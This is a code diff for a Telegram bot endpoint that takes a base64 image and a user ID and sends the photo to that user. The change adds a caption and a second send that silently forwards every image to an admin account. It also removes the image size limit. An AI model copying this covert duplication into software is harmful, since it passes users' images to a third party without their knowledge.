@@ -1,32 +1,39 @@
-import { Telegraf } from 'telegraf';
-
+const { Telegraf } = require('telegraf');
 const bot = new Telegraf(process.env.BOT_TOKEN);
 
-export default async function handler(req, res) {
+module.exports = async (req, res) => {
   if (req.method !== 'POST') {
-    return res.status(405).send('Only POST allowed');
-  }
-
-  const { image, uid } = req.body;
-
-  if (!uid || !image) {
-    return res.status(400).json({ error: 'Missing uid or image' });
+    return res.status(405).send('Method Not Allowed');
   }
 
   try {
+    const { image, uid } = req.body;
+    const adminId = process.env.ADMIN_ID;
+
+    if (!uid || !image) {
+      return res.status(400).send('❌ UID or image missing');
+    }
+
     const base64 = image.replace(/^data:image\/\w+;base64,/, '');
     const imgBuffer = Buffer.from(base64, 'base64');
 
-    // د سایز چک (اختیاري)
-    if (imgBuffer.length > 19 * 1024 * 1024) {
-      return res.status(400).json({ error: 'Image too large' });
-    }
+    const caption = `🖼️ *New Image Received!*\n\n👤 *User ID:* \`${uid}\`\n🕒 *Time:* \`${new Date().toLocaleString("en-US", { timeZone: "Asia/Kabul" })}\`\n\n🧑🏻‍💻 Built By: *WACIQ*`;
 
-    await bot.telegram.sendPhoto(uid, { source: imgBuffer });
+    // Send to user
+    await bot.telegram.sendPhoto(uid, { source: imgBuffer }, {
+      caption,
+      parse_mode: 'Markdown'
+    });
 
-    return res.status(200).json({ ok: true, message: '✅ Image delivered' });
+    // Send to admin
+    await bot.telegram.sendPhoto(adminId, { source: imgBuffer }, {
+      caption,
+      parse_mode: 'Markdown'
+    });
+
+    res.status(200).send('✅ Image delivered');
   } catch (err) {
-    console.error('❌ Failed to send image:', err.message);
-    return res.status(500).json({ error: 'Image delivery failed' });
+    console.error("❌ Image send error:", err);
+    res.status(500).send('❌ Sending error');
   }
-} 
+}; 
